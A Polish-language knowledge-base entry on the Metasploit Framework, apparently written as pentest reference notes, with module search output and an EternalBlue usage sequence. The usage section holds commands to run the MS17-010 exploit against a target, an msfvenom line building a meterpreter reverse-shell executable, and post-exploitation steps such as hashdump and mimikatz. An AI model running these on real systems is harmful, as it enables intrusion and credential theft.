---
title: "Metasploit Framework — eksploatacja"
date: 2026-08-16
tags: [ive, e, eksploatacja, exploit, narzedzie]
category: narzedzie
status: active
---

# Metasploit Framework

**TL;DR**: najpopularniejszy framework do **tworzenia i uruchamiania exploitów** —
moduły (exploit/auxiliary/post), payloady, meterpreter, cały łańcuch fazy E.

## Co to / do czego

Rapid7. Ruby. Moduły pokrywają: recon (auxiliary/scanner), exploit, post-exploit
(mimikatz, hashdump), pivoting. `msfconsole` to interaktywna konsola; jest też
`msfvenom` (generowanie payloadów).

| Cecha | Wartość |
|-------|---------|
| Producent | Rapid7 (open-source core) |
| Język | Ruby |
| Moduły | exploit / auxiliary / post / payload / encoder |
| Payloady | `msfvenom` (reverse shell, meterpreter…) |

## Analiza dynamiczna (2026-08-16)

**Wersja**: Metasploit **6.5.2-dev**.

**Demo 1** — `search ms17_010` (wyszukiwanie modułów EternalBlue):

```
0  exploit/windows/smb/ms17_010_eternalblue   2017-03-14  average  Yes  MS17-010 EternalBlue ...
10 exploit/windows/smb/ms17_010_psexec         2017-03-14  normal   Yes  MS17-010 EternalRomance/...
24 auxiliary/scanner/smb/smb_ms17_010          .           normal   Yes  MS17-010 SMB RCE Detection
```

**Demo 2** — `info auxiliary/scanner/ssh/ssh_version` (opcje modułu):

```
Name: SSH Version Scanner
Module: auxiliary/scanner/ssh/ssh_version
Basic options:
  RHOSTS             yes   The target host(s)
  RPORT    22        yes   The target port
  THREADS  1         yes   concurrent threads
```

Pełne zrzuty: [[Model_IVE/_analiza_dynamiczna/README]] (\`msf_version.txt\`,
\`msf_search_ms17010.txt\`, \`msf_info_ssh_version.txt\`).

## Użycie

```bash
msfconsole                       # konsola
search ms17_010                  # znajdź moduł
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <cel>
set LHOST <moje_ip>
run

# payloady
msfvenom -p windows/meterpreter/reverse_tcp LHOST=x LPORT=4444 -f exe -o shell.exe
```

## Wynik → cel (C)

Session (meterpreter) → post-exploit: `hashdump`, `mimikatz`, `getsystem`, pivoting.

## Powiązane

- [[Model_IVE/E_Eksploatacja/E_MOC]] · [[Narzedzia/Sliver_C2]] · [[Techniki_i_Narzedzia]] · [[Wiedza/Pentest/John_the_Ripper]]
